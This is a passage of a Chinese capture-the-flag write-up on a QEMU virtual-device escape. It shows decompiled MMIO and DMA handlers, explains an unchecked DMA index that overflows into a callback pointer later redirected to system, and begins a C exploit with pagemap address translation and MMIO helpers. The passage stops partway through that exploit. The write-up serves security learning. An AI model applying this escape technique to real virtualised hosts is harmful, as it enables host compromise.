__fastcall <span class="title">hitb_mmio_read</span><span class="params">(HitbState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> val; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">128</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;dma.src;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x80</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">140</span> )</span><br><span class="line">        <span class="keyword">return</span> *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.dst + <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">0x8C</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">132</span> )</span><br><span class="line">          <span class="keyword">return</span> *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.src + <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">136</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.dst;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">144</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.cnt;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">152</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.cmd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        val = opaque-&gt;fact;</span><br><span class="line">        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0x10000ED</span>LL;</span><br><span class="line">        <span class="keyword">if</span> ( !addr )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;addr4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">32</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;status;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">36</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;irq_status;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要满足<code>size == 4</code>才能读取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_mmio_write</span><span class="params">(HitbState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> v4; <span class="comment">// r13d</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">int64_t</span> ns; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (addr &gt; <span class="number">0x7F</span> || size == <span class="number">4</span>) &amp;&amp; (((size - <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFB</span>) == <span class="number">0</span> || addr &lt;= <span class="number">0x7F</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">128</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        opaque-&gt;dma.src = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = val;</span><br><span class="line">      <span class="keyword">if</span> ( addr &gt; <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">140</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">            *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.dst + <span class="number">4</span>) = val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">0x8C</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( addr == <span class="number">144</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">              opaque-&gt;dma.cnt = val;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">152</span> &amp;&amp; (val &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;dma.cmd = val;</span><br><span class="line">            ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);</span><br><span class="line">            timer_mod(&amp;opaque-&gt;dma_timer, ns / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">132</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">            *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.src + <span class="number">4</span>) = val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">136</span> &amp;&amp; (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;dma.dst = val;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">32</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (val &amp; <span class="number">0x80</span>) != <span class="number">0</span> )</span><br><span class="line">          _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">0x80</span>u);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          _InterlockedAnd((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">0xFFFFFF7F</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">96</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)val | opaque-&gt;irq_status) == <span class="number">0</span>;</span><br><span class="line">          opaque-&gt;irq_status |= val;</span><br><span class="line">          <span class="keyword">if</span> ( !v6 )</span><br><span class="line">            hitb_raise_irq(opaque, <span class="number">0x60</span>u);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">100</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = ~(_DWORD)val;</span><br><span class="line">          v6 = (v5 &amp; opaque-&gt;irq_status) == <span class="number">0</span>;</span><br><span class="line">          opaque-&gt;irq_status &amp;= v5;</span><br><span class="line">          <span class="keyword">if</span> ( v6 &amp;&amp; !msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;addr4 = ~(_DWORD)val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">8</span> &amp;&amp; (opaque-&gt;status &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        opaque-&gt;fact = v4;</span><br><span class="line">        _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">1u</span>);</span><br><span class="line">        qemu_cond_signal(&amp;opaque-&gt;thr_cond);</span><br><span class="line">        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样需要满足<code>size == 4</code>，并且在部分操作还需要满足<code>(opaque-&gt;dma.cmd &amp; 1) == 0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_dma_timer</span><span class="params">(HitbState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *cnt_low; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *v6; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  cmd = opaque-&gt;dma.cmd;</span><br><span class="line">  <span class="keyword">if</span> ( (cmd &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (cmd &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(LODWORD(opaque-&gt;dma.src) - <span class="number">0x40000</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (cmd &amp; <span class="number">4</span>) != <span class="number">0</span> )                     <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = &amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">        opaque-&gt;enc(v7, opaque-&gt;dma.cnt);</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)v7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// 3</span></span><br><span class="line">      &#123;</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)&amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">      &#125;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.dst, cnt_low, opaque-&gt;dma.cnt, <span class="number">1</span>);</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// 1</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="keyword">uint8_t</span> *)&amp;opaque[<span class="number">-36</span>] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)opaque-&gt;dma.dst - <span class="number">2824</span>;</span><br><span class="line">      LODWORD(cnt_low) = (_DWORD)opaque + opaque-&gt;dma.dst - <span class="number">0x40000</span> + <span class="number">3000</span>;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, <span class="number">0</span>);</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (v4 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)LODWORD(opaque-&gt;dma.cnt);</span><br><span class="line">        opaque-&gt;enc((<span class="keyword">char</span> *)v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)cnt_low);</span><br><span class="line">        v4 = opaque-&gt;dma.cmd;</span><br><span class="line">        v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    opaque-&gt;dma.cmd = v4 &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">      hitb_raise_irq(opaque, (<span class="keyword">uint32_t</span>)cnt_low);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是回调函数了，在上面的<code>hitb_mmio_write</code>函数中，当满足<code>if ( addr == 0x98 &amp;&amp; (val &amp; 1) != 0 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )</code>就会调用了。而在这个函数中存在这样一个函数<code>cpu_physical_memory_rw</code>，这个函数在我翻看手册的时候还发现了其他类似的函数<code>cpu_physical_memory_read</code>、<code>cpu_physical_memory_write</code>所以可以猜测得到这个函数到底是干什么的。这个函数就是用于传递内容在物理地址和虚拟地址之间。<code>cpu_physical_memory_rw</code>函数的第一个参数时物理地址，虚拟地址需要通过读取/proc/$pid/pagemap转换为物理地址。</p><ol><li> dma.cmd==7时，idx=dma.src-0x40000，addr = dma_buf[idx]，调用enc加密函数加密，并写入到dma.dst中</li><li> dma.cmd==3时，idx=dma.src-0x40000，addr = dma_buf[idx]，写入到dma.dst中</li><li> dma.cmd==1时，idx=dma.dst-0x40000,addr=dma_buf[idx]，将其写入到dma.src中（第二个参数可以通过调试得到其地址就是dma_buf[dma.dst-0x40000]</li></ol><p>这个程序的作用就显而易见，这里实现的是一个dma机制。DMA(Direct Memory Access，直接内存存取) 是所有现代电脑的重要特色，它允许不同速度的硬件装置来沟通，而不需要依赖于 CPU 的大量中断负载。DMA 传输将数据从一个地址空间复制到另外一个地址空间。当CPU 初始化这个传输动作，传输动作本身是由 DMA 控制器来实行和完成。</p><p>即首先通过访问mmio地址与值（addr与value），在<code>hitb_mmio_write</code>函数中设置好dma中的相关值（src、dst以及cmd)。当需要dma传输数据时，设置addr为152，就会触发时钟中断，由另一个线程去处理时钟中断。时钟中断调用<code>hitb_dma_timer</code>，该函数根据<code>dma.cmd</code>的不同调用<code>cpu_physical_memory_rw</code>函数将数据从物理地址拷贝到<code>dma_buf</code>中或从<code>dma_buf</code>拷贝到物理地址中。</p><h3 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h3><p>接下来就是分析程序的漏洞了，这里的漏洞是非常明显的位于<code>hitb_dma_timer</code>函数中，其中的v2是没有做任何边界检查的，存在明显的溢出漏洞。</p><p>并且在上述找到的结构体看到了，他的<code>dma_buf</code>的大小只有4096，并且下方紧接着就是enc。而我们都知道enc存放的是回调函数，所以这里的利用思路就是，通过溢出泄漏出enc中存放的函数地址，紧接着修改其中的函数为<code>system@plt</code>，最后在<code>dma_buf</code>中写入<code>cat flag\x00</code>即可获取flag。</p><p><strong>exp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DMABASE 0x40000</span></span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_src</span><span class="params">(<span class="keyword">uint32_t</span> src_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    